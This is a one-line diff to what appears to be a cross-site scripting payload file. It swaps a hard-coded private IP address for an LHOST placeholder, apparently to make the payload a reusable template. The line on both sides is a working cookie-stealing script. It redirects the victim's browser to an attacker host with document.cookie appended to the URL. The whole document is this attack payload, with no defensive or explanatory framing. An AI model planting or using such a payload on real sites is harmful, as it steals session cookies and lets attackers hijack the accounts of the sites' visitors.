@@ -1,1 +1,1 @@
-<script>document.location = "http://172.16.156.132?cookies="+document.cookie;</script>
+<script>document.location = "http://LHOST?cookies="+document.cookie;</script>
